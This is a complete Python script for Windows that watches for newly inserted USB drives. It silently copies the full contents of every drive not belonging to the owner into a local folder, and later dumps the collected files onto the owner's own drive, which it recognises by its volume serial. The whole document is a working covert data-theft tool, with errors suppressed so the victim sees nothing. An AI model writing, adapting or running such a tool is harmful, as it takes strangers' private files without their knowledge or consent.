# encoding: gbk
import os
import string
import time
from datetime import datetime
import shutil
import win32api


def get_disklist():
    disk_list = []
    for c in string.ascii_uppercase:
        disk = c + ':/'
        if os.path.isdir(disk):
            disk_list.append(disk)
    return disk_list


def copy_dir(src_path, target_path):
    if os.path.isdir(src_path) and os.path.isdir(target_path):
        filelist_src = os.listdir(src_path)
        for file in filelist_src:
            path = os.path.join(os.path.abspath(src_path), file)
            if os.path.isdir(path):
                path1 = os.path.join(os.path.abspath(target_path), file)
                if not os.path.exists(path1):
                    os.mkdir(path1)
                copy_dir(path, path1)
            else:
                with open(path, 'rb') as read_stream:
                    contents = read_stream.read()
                    path1 = os.path.join(target_path, file)
                    with open(path1, 'wb') as write_stream:
                        write_stream.write(contents)


notUSBDisk = ['C:/', 'D:/', 'E:/']
oldDiskList = notUSBDisk  # get_disklist()
saveToPath = "./USB/"

while True:
    newDiskList = get_disklist()
    if newDiskList != oldDiskList:
        oldDiskList = notUSBDisk
        try:
            for i in newDiskList:
                if i not in oldDiskList:
                    usb_uuid = str(win32api.GetVolumeInformation(i)[1])
                    if usb_uuid == 'XXXXXXXXXX':  # 你的U盘ID，不是cmd里vol获取的ID，是win32api.GetVolumeInformation(盘符)[1]
                        copy_dir(saveToPath, i + 'copied_files')
                        oldDiskList.append(i)
                    else:
                        shutil.copytree(i, os.path.join(saveToPath) + usb_uuid + '/' + datetime.now().strftime(
                            "%Y-%m-%d_%H%M%S"))
                        oldDiskList.append(i)
        except WindowsError:
            pass
    time.sleep(10)
